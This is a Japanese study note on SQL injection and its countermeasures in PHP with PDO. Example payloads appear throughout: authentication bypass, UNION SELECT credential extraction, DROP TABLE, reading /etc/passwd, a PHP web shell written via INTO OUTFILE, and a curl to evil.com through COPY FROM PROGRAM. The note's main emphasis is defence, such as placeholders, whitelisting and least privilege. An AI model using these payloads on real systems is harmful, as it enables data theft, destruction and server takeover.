## 💉 SQLインジェクション

**SQLインジェクション（SQL Injection）** は、Webアプリケーションが生成する SQL 文に **悪意ある入力を混入** させ、データベースを不正操作する攻撃です。

| 項目 | 内容 |
|------|------|
| **分類** | インジェクション系脆弱性 |
| **インターフェース** | SQL |
| **悪用手口** | SQL 文・SQL コマンドの注入 |

### なぜ起きるか

```php
// ❌ 脆弱：ユーザー入力を SQL 文字列に直接連結
$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
```

```
ユーザー入力 → SQL 文字列に連結 → DB が入力を「命令」として解釈 → 不正操作
```

**根本原因:** SQL の **命令部分** と **データ部分** を分離せず、ユーザー入力をそのまま SQL に埋め込んでいる。

### SQL の基本（攻撃を読むために）

```sql
SELECT * FROM users
WHERE username = 'alice'
  AND password = 'password123'
```

| 記号・キーワード | 意味 |
|----------------|------|
| `'...'` | 文字列リテラル（シングルクォートで囲む） |
| `--` | 行コメント（以降を無視） |
| `OR` | 「または」条件 |
| `1=1` | 常に真（TRUE） |
| `;` | SQL 文の区切り |
| `UNION` | 2つの SELECT 結果を結合 |

## 🚨 エラーメッセージ経由の情報漏洩

SQL 実行時の **詳細なエラーメッセージ** を画面に表示すると、攻撃者に **SQLインジェクションの手がかり** を与えます。

### 漏洩する情報

| エラー内容 | 攻撃者へのメリット |
|-----------|------------------|
| テーブル名 | `users` 等の存在を確認 |
| カラム名 | `password`, `email` 等の構造を推測 |
| SQL 文の断片 | 注入ポイントの特定 |
| DB の種類 | MySQL / PostgreSQL 向け攻撃の選択 |

### 攻撃の流れ

```
1. 攻撃者が意図的に不正入力を送る
   入力: '

2. DB がエラーを返す
   エラー: You have an error in your SQL syntax near ''' at line 1

3. 攻撃者が SQL 構造を推測
   → username = '...' 形式だと分かる

4. 段階的に攻撃を洗練
   ' OR '1'='1' --
   ' UNION SELECT ...
```

### 対策

- 本番環境では **詳細エラーを画面に表示しない**
- エラー詳細は **サーバーログ** に記録
- ユーザーには汎用メッセージのみ表示

## 📂 UNION SELECTを用いた情報漏洩

**UNION SELECT** を悪用すると、本来アクセスできない **他テーブルのデータ** を取得できます。

### UNION とは

```sql
-- 2つの SELECT 結果を縦に結合
SELECT name, email FROM users WHERE id = 1
UNION
SELECT username, password FROM admin_users;
```

**条件:** 両方の SELECT の **列数と型** が一致している必要がある。

### 攻撃例

```sql
-- 脆弱な SQL
SELECT * FROM products WHERE name = '$input'

-- 攻撃入力
' UNION SELECT username, password, email, null FROM users --

-- 生成される SQL
SELECT * FROM products WHERE name = ''
UNION SELECT username, password, email, null FROM users --'
```

### 攻撃の手順

```
1. 列数を特定（ORDER BY 1, ORDER BY 2, ... でエラーが出るまで試行）
2. 表示可能な列を特定
3. UNION SELECT で機密データを取得
```

### 被害

- ユーザーテーブル全件の漏洩
- パスワードハッシュの取得
- 管理者アカウント情報の窃取

## 🔓 SQLインジェクションによる認証回避

ログイン処理は SQLインジェクションの **最も典型的な標的** です。

### 脆弱なログイン処理

```php
$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'
        AND password = '" . $_POST['password'] . "'";
```

### 攻撃入力

```
ユーザー名: admin' --
パスワード: （任意・空でも可）
```

### 生成される SQL

```sql
SELECT * FROM users WHERE username = 'admin' --'
AND password = '...'
--            ↑ ここ以降はコメントアウト（パスワード条件が無効）
```

### 別パターン

```
ユーザー名: ' OR '1'='1' --
→ WHERE 条件が常に TRUE になり、最初のユーザーでログイン成功
```

### 対策

- **プレースホルダ** で SQL とデータを分離（後述）
- パスワードは **ハッシュ比較**（平文保存は別問題として避ける）

## ✏️ SQLインジェクション攻撃によるデータ改ざん

SQLインジェクションは **データの読み取り（SELECT）** だけでなく、**改ざん・削除** も可能です。

### UPDATE / DELETE の注入

```sql
-- プロフィール更新（脆弱）
UPDATE users SET email = '$input' WHERE id = $userId

-- 攻撃入力
', is_admin = 1 WHERE id = 1 --

-- 結果：管理者権限が付与される
```

### DROP TABLE

```sql
-- 攻撃入力
'; DROP TABLE users; --

-- 複文が実行可能な環境ではテーブルごと削除
```

### INSERT の注入

```sql
-- 攻撃者が管理者アカウントを直接 INSERT
'; INSERT INTO users (username, is_admin) VALUES ('hacker', 1); --
```

### 被害

| 操作 | 被害 |
|------|------|
| UPDATE | 権限昇格、データ書き換え |
| DELETE | データの大量削除 |
| INSERT | 不正アカウントの作成 |
| DROP | テーブル・DB の破壊 |

## ⚙️ SQLコマンドの実行

DBMS によっては、SQLインジェクション経由で **OS コマンド** を実行できる場合があります。

### MySQL の例

```sql
-- UDF（User Defined Function）や特定設定が有効な場合
SELECT sys_exec('id');
```

### SQL Server の例

```sql
-- xp_cmdshell（有効な場合）
EXEC xp_cmdshell 'whoami';
```

### PostgreSQL の例

```sql
COPY ... FROM PROGRAM 'curl http://evil.com'
```

### 条件

| 条件 | 説明 |
|------|------|
| **DB ユーザーの権限** | SUPER 権限等が必要なことが多い |
| **DBMS の設定** | 危険な機能が有効化されている |
| **複文実行** | `;` で複数 SQL を実行できる |

**対策:** 最小権限の DB ユーザー + 複文実行の禁止 + プレースホルダ

## 📁 ファイルの読み出し、書き出し

MySQL 等では、SQLインジェクション経由で **サーバー上のファイル** にアクセスされる恐れがあります。

### ファイル読み出し（MySQL）

```sql
-- LOAD_FILE 関数
' UNION SELECT LOAD_FILE('/etc/passwd'), null, null --
```

### ファイル書き出し（MySQL）

```sql
-- INTO OUTFILE
' UNION SELECT '<?php system($_GET["c"]); ?>', null
INTO OUTFILE '/var/www/html/shell.php' --
```

### 条件

| 操作 | 必要な条件 |
|------|-----------|
| LOAD_FILE | FILE 権限、secure_file_priv の設定 |
| INTO OUTFILE | FILE 権限、書き込み可能なディレクトリ |

### 対策

- DB ユーザーに **FILE 権限を与えない**
- `secure_file_priv` を適切に設定
- Web ルートへの書き込み権限を DB ユーザーに与えない

## 🌐 HTTPリクエストにより他のサーバーを攻撃

SQLインジェクションを踏み台に、**他のサーバーへ HTTP リクエスト** を送る攻撃（SSRF に近い）もあります。

### 例

```sql
-- MySQL の LOAD DATA INFILE や UDF 経由
-- SQL Server の OLE Automation 等

-- 概念例：DB 機能を使った外部通信
SELECT http_get('http://internal-server/admin/delete?id=1');
```

### 被害

| 被害 | 説明 |
|------|------|
| **内部ネットワークのスキャン** | ファイアウォール内のサーバーへアクセス |
| **内部 API の不正呼び出し** | 認証なしの内部サービスを攻撃 |
| **ポートスキャン** | ネットワーク構成の把握 |

### 対策

- DB から外部ネットワークへの通信を **制限**
- 最小権限 + 危険な拡張機能の無効化

## 📝 文字リテラルの問題

SQL インジェクションが最も起きやすいのは、**文字列リテラル（`'...'`）** にユーザー入力を埋め込む場合です。

### 脆弱なパターン

```php
$name = $_GET['name'];
$sql = "SELECT * FROM users WHERE name = '$name'";
```

### 攻撃の仕組み

```
正常:  WHERE name = 'alice'
攻撃:  WHERE name = 'alice' OR '1'='1' --'
              ↑ シングルクォートで文字列を閉じ、SQL を注入
```

### 対策

| 対策 | 説明 |
|------|------|
| **プレースホルダ** | データを SQL 命令と分離（根本対策） |
| **エスケープ** | `'` を `''` に変換（プレースホルダの補助、単独では非推奨） |

```php
// ❌ エスケープのみに頼る（非推奨）
$name = str_replace("'", "''", $_GET['name']);

// ✅ プレースホルダを使う
$stmt = $pdo->prepare('SELECT * FROM users WHERE name = ?');
$stmt->execute([$_GET['name']]);
```

## 🔢 数値項目に対するSQLインジェクション

数値項目は引用符で囲まないため **文字列リテラルより安全に見えますが**、検証を怠ると SQL インジェクションが成立します。

### 脆弱なパターン

```php
$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = $id";  // 引用符なし
```

### 攻撃入力

```
?id=1 OR 1=1
?id=1; DROP TABLE products; --
?id=1 UNION SELECT username, password FROM users
```

### 生成される SQL

```sql
SELECT * FROM products WHERE id = 1 OR 1=1
-- 全商品が返る

SELECT * FROM products WHERE id = 1; DROP TABLE products; --
-- テーブル削除（複文実行が可能な場合）
```

### 対策

```php
// ✅ 数値として検証してから使用
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) {
    die('不正な ID です');
}

// ✅ さらにプレースホルダを使う（推奨）
$stmt = $pdo->prepare('SELECT * FROM products WHERE id = ?');
$stmt->execute([$id]);
```

**原則:** 数値項目でも **型検証 + プレースホルダ** を使う。

## 🔧 プレースホルダによるSQL文組み立て

**プレースホルダ（Prepared Statement / プリペアドステートメント）** は、SQLインジェクション対策の **最も重要な手法** です。

### 仕組み

```
① SQL の「骨格」を先に DB に送る
   SELECT * FROM users WHERE username = ? AND password = ?

② プレースホルダ（?）の位置が確定 → SQL の意味が固定

③ データを後からバインド
   'alice', 'password123'

④ データは「値」としてのみ扱われ、SQL 命令として解釈されない
```

### PHP（PDO）の例

```php
// ✅ 安全
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);
```

```php
// 名前付きプレースホルダ
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :name');
$stmt->execute(['name' => $username]);
```

### 攻撃入力が無害化される例

```
入力: admin' OR '1'='1' --

プレースホルダ使用時:
  → 文字列「admin' OR '1'='1' --」というユーザー名を検索するだけ
  → SQL 命令として解釈されない ✅
```

---

## 🛡️ PDOの安全な利用法（PDOのオプション）

PHP の **PDO（PHP Data Objects）** を使う場合、**オプション設定** によって安全性が大きく変わります。

### 推奨設定

```php
$pdo = new PDO($dsn, $user, $pass, [
    // ① ネイティブプリペアドステートメント（静的プレースホルダ）
    PDO::ATTR_EMULATE_PREPARES => false,

    // ② 例外モード
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,

    // ③ デフォルトフェッチモード（任意）
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
]);
```

### 主要オプション一覧

| オプション | 推奨値 | 効果 |
|-----------|--------|------|
| `ATTR_EMULATE_PREPARES` | `false` | DB 側でプリペア（静的プレースホルダ） |
| `ATTR_ERRMODE` | `ERRMODE_EXCEPTION` | エラーを例外として扱う |
| `ATTR_DEFAULT_FETCH_MODE` | `FETCH_ASSOC` | 連想配列で取得 |

---

## ⚠️ PDOで例外処理を使用する

`PDO::ATTR_ERRMODE` を **例外モード** に設定すると、エラーを適切に処理できます。

### 設定

```php
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
```

### 安全な例外処理

```php
try {
    $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
    $stmt->execute([$id]);
    $user = $stmt->fetch();
} catch (PDOException $e) {
    // ❌ 詳細をユーザーに表示しない
    // echo $e->getMessage();

    // ✅ ログに記録し、汎用メッセージを表示
    error_log($e->getMessage());
    echo '処理中にエラーが発生しました。';
}
```

### 例外モードの利点

| 利点 | 説明 |
|------|------|
| **エラーの見落とし防止** | 失敗時に処理が続行されない |
| **一貫したエラー処理** | try-catch で統一的に処理 |
| **情報漏洩の防止** | 詳細をログのみに記録 |

## 🚫 複文の実行を禁止する

**複文（複数 SQL の連続実行）** が可能だと、`; DROP TABLE` 等の攻撃が成立しやすくなります。

### 危険な例

```sql
SELECT * FROM users WHERE id = 1; DROP TABLE users; --
```

### 対策

| 対策 | 説明 |
|------|------|
| **プレースホルダ** | 1 文ずつ実行 |
| **mysqlnd の設定** | `PDO::MYSQL_ATTR_MULTI_STATEMENTS => false`（MySQL） |
| **DB ユーザー権限** | 不要な権限を剥奪 |

```php
// MySQL：複文実行を禁止
$pdo = new PDO($dsn, $user, $pass, [
    PDO::ATTR_EMULATE_PREPARES => false,
    PDO::MYSQL_ATTR_MULTI_STATEMENTS => false,
]);
```

---

## 📌 静的プレースホルダを指定する

**静的プレースホルダ** とは、DB サーバー側で SQL を **事前コンパイル** し、プレースホルダの位置を固定する方式です。

### 設定方法

```php
PDO::ATTR_EMULATE_PREPARES => false  // 静的（ネイティブ）プレースホルダ
```

### 静的プレースホルダの流れ

```
1. PREPARE: SELECT * FROM users WHERE id = ?
   → DB が SQL 構造をコンパイル

2. EXECUTE: [123]
   → データのみバインドして実行

3. EXECUTE: [456]
   → 同じ SQL に別データをバインド（再利用可能）
```

---

## 🔄 静的プレースホルダと動的プレースホルダの違い

PDO には **エミュレート（模擬）** モードがあり、動作が異なります。

| | 静的プレースホルダ | 動的プレースホルダ（エミュレート） |
|---|------------------|-------------------------------|
| **設定** | `EMULATE_PREPARES = false` | `EMULATE_PREPARES = true`（一部環境のデフォルト） |
| **処理場所** | DB サーバー | PHP（クライアント）側 |
| **SQL コンパイル** | DB が事前にコンパイル | PHP が `?` を置換してから送信 |
| **安全性** | **高い（推奨）** | 設定次第でリスクあり |
| **同一 SQL の再利用** | 効率的 | 毎回置換 |

### 動的（エミュレート）の問題

```
EMULATE_PREPARES = true の場合:
  PHP が ? を値に置換してから DB に送る
  → 実装によってはエスケープ漏れのリスク
  → 必ず false に設定する
```

**推奨:** 常に `PDO::ATTR_EMULATE_PREPARES => false`

## 🔍 ワイルドカードのエスケープが必要な文字

**LIKE 句** で部分一致検索を行う場合、`%` と `_` はワイルドカードとして特別な意味を持ちます。

### ワイルドカード

| 文字 | 意味 |
|------|------|
| `%` | 任意の 0 文字以上 |
| `_` | 任意の 1 文字 |

### 問題

```php
// ユーザーが「100%」を検索
$keyword = '100%';
$sql = "SELECT * FROM products WHERE name LIKE '%$keyword%'";
// → LIKE '%100%%' となり「100」で始まるすべてにマッチ
```

### 対策：ESCAPE 句

```php
// ✅ ワイルドカードをエスケープ
$keyword = str_replace(['\\', '%', '_'], ['\\\\', '\\%', '\\_'], $userInput);
$stmt = $pdo->prepare('SELECT * FROM products WHERE name LIKE ? ESCAPE \'\\\'');
$stmt->execute(['%' . $keyword . '%']);
```

### エスケープが必要な文字

| 文字 | エスケープ後 |
|------|------------|
| `\` | `\\` |
| `%` | `\%` |
| `_` | `\_` |

**注意:** LIKE 用のエスケープは **プレースホルダとは別** の処理。プレースホルダで SQL 注入を防ぎ、LIKE 用にワイルドカードをエスケープする。

## 🔎 検索条件が動的に変わる場合

「キーワード」「カテゴリ」「価格帯」など、**条件の組み合わせが可変** する検索では、SQL の組み立て方に注意が必要です。

### 危険なパターン

```php
// ❌ 列名をユーザー入力から構成
$column = $_GET['field'];
$sql = "SELECT * FROM products WHERE $column = ?";  // 列名はプレースホルダ不可！
```

### 安全なパターン

```php
// ✅ 列名はホワイトリストで検証
$allowedFields = ['name', 'category', 'price'];
$field = $_GET['field'];
if (!in_array($field, $allowedFields, true)) {
    die('不正な検索項目です');
}

$conditions = [];
$params = [];

if (!empty($_GET['name'])) {
    $conditions[] = 'name LIKE ?';
    $params[] = '%' . escapeLike($_GET['name']) . '%';
}
if (!empty($_GET['category'])) {
    $conditions[] = 'category = ?';
    $params[] = $_GET['category'];
}

$where = $conditions ? 'WHERE ' . implode(' AND ', $conditions) : '';
$sql = "SELECT * FROM products $where";
$stmt = $pdo->prepare($sql);
$stmt->execute($params);
```

### ポイント

| 項目 | 対策 |
|------|------|
| **値** | プレースホルダ |
| **列名・テーブル名** | ホワイトリスト |
| **演算子（AND/OR）** | コード側で固定 |
| **LIKE パターン** | ワイルドカードエスケープ |

## 📊 様々な列でのソート

**ORDER BY** 句にユーザー入力をそのまま使うと、SQL インジェクションの原因になります。

### 危険なパターン

```php
// ❌ 脆弱
$sort = $_GET['sort'];
$sql = "SELECT * FROM products ORDER BY $sort";
// 攻撃: ?sort=price; DROP TABLE products; --
```

### 安全なパターン

```php
// ✅ ソート列をホワイトリストで限定
$allowedSort = [
    'name'  => 'name ASC',
    'price' => 'price ASC',
    'date'  => 'created_at DESC',
];
$sort = $_GET['sort'] ?? 'name';
$orderBy = $allowedSort[$sort] ?? $allowedSort['name'];

$sql = "SELECT * FROM products ORDER BY $orderBy";
// 列名はホワイトリストから選ばれた固定値のみ
```

### 昇順・降順の切り替え

```php
$allowedColumns = ['name', 'price', 'created_at'];
$column = $_GET['column'] ?? 'name';
$dir = ($_GET['dir'] ?? 'asc') === 'desc' ? 'DESC' : 'ASC';

if (!in_array($column, $allowedColumns, true)) {
    $column = 'name';
}

$sql = "SELECT * FROM products ORDER BY $column $dir";
```

**原則:** ORDER BY の **列名・方向** はユーザー入力を直接使わず、**許可リストから選択** する。

## 🛡️ SQLインジェクション保険的対策

**プレースホルダ** が根本対策ですが、万が一の被害を **軽減する保険** も重要です。

```
根本対策:  プレースホルダ（Prepared Statement）
保険的対策: エラー抑止、入力検証、DB 権限設定
```

---

## 🔇 詳細なエラーメッセージの抑止

本番環境では DB エラーの **詳細をユーザーに見せない** ようにします。

```php
// 本番環境
ini_set('display_errors', '0');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

try {
    // DB 処理
} catch (PDOException $e) {
    error_log($e->getMessage());  // ログのみ
    http_response_code(500);
    echo 'エラーが発生しました。';
}
```

| 環境 | 表示 |
|------|------|
| **開発** | 詳細エラー表示（デバッグ用） |
| **本番** | 汎用メッセージのみ |

## ✅ 入力値の妥当性の検証

プレースホルダの **補助** として、[[02_Webアプリの機能と脆弱性（徳丸本4章）|第4章]] で学んだ入力値検証を行います。

### SQL 関連の検証例

| 項目 | 検証 |
|------|------|
| ID | 整数か、正の値か |
| ページ番号 | 1〜9999 の範囲 |
| ソート項目 | 許可リストに含まれるか |
| 検索キーワード | 最大文字数 |

```php
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false || $id < 1) {
    die('不正な ID です');
}
```

**注意:** 入力値検証だけでは SQL インジェクションを完全に防げない。**プレースホルダと併用** する。

## 🔐 データベースの権限設定

DB ユーザーには **必要最小限の権限** のみを付与します。万が一 SQL インジェクションが成功しても **被害を限定** できます。

### 権限の原則

| 権限 | Web アプリ用 DB ユーザー |
|------|------------------------|
| SELECT | 必要なテーブルのみ |
| INSERT / UPDATE / DELETE | 必要なテーブルのみ |
| DROP / CREATE / ALTER | ❌ 付与しない |
| FILE | ❌ 付与しない |
| SUPER / SHUTDOWN | ❌ 付与しない |
| GRANT | ❌ 付与しない |

### 例（MySQL）

```sql
-- アプリ専用ユーザーを作成
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- 必要な操作のみ許可
GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.* TO 'webapp'@'localhost';

-- 管理用ユーザーとは別アカウントにする
```

### 多層防御

```
1. プレースホルダ     → 攻撃そのものを防ぐ
2. 入力値検証         → 不正入力を早期に弾く
3. エラー抑止         → 情報漏洩を防ぐ
4. 最小権限           → 突破されても被害を限定
```

## 📝 まとめ

| トピック | 要点 |
|---------|------|
| SQLインジェクション | 悪意ある SQL を注入して DB を不正操作 |
| エラーメッセージ経由 | 詳細エラーが SQL 構造の手がかりになる |
| UNION SELECT | 他テーブルのデータを結合して窃取 |
| 認証回避 | `' OR '1'='1' --` 等でログインを突破 |
| データ改ざん | UPDATE / DELETE / DROP による破壊 |
| OS コマンド実行 | DB 拡張機能の悪用（権限依存） |
| ファイル読み書き | LOAD_FILE / INTO OUTFILE 等 |
| 文字リテラル | 引用符で囲む箇所が注入ポイント |
| 数値項目 | 引用符なしでも OR / UNION で攻撃可能 |
| プレースホルダ | **根本対策**。SQL とデータを分離 |
| PDO オプション | `EMULATE_PREPARES=false`, 例外モード |
| 複文禁止 | `;` による複数 SQL 実行を防ぐ |
| 静的プレースホルダ | DB 側で事前コンパイル（推奨） |
| LIKE ワイルドカード | `%` `_` をエスケープ |
| 動的検索・ソート | 列名はホワイトリスト、値はプレースホルダ |
| 保険的対策 | エラー抑止、入力検証、最小権限 |

### 対策の優先順位

```
1. プレースホルダによる SQL 文組み立て（必須）
2. PDO: EMULATE_PREPARES = false、例外処理、複文禁止
3. 動的な列名・ORDER BY はホワイトリスト
4. LIKE 検索はワイルドカードをエスケープ
5. 詳細エラーを抑止
6. 入力値の妥当性検証（補助）
7. DB ユーザーの最小権限（保険）
```
